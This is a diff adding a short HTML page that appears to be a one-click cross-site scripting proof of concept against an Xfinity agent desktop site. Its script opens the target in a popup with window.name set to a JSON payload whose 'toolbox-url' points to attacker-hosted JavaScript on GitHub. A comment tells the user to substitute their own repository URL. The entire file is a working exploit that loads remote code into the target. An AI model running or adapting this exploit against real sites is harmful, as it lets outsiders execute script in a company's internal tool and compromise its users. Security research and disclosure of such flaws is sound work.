@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Open Agent Desktop</title>
+</head>
+<body>
+    <button onclick="triggerXSS()">Open Agent Desktop</button>
+    <p>Click the button to load Agent Desktop (1-click interaction)</p>
+    <script>
+        function triggerXSS() {
+            // Malicious payload (matches target's decodeURIComponent logic)
+            const payload = {
+                "nuance-toolbox": true,
+                "username": "poc-test",
+                "password": "poc-test",
+                // REPLACE WITH YOUR GITHUB REPO RAW JS URL (e.g., https://raw.githubusercontent.com/YOUR-USER/xss-poc/main/poc.js)
+                "toolbox-url": "https://raw.githubusercontent.com/YOUR-USER/xss-poc/main/poc.js"
+            };
+            // Open popup with window.name set (reliable cross-browser)
+            window.open(
+                "https://agent-asha.xchat.xfinity.com/",
+                encodeURIComponent(JSON.stringify(payload)) // Sets popup's window.name
+            );
+        }
+    </script>
+</body>
+</html>
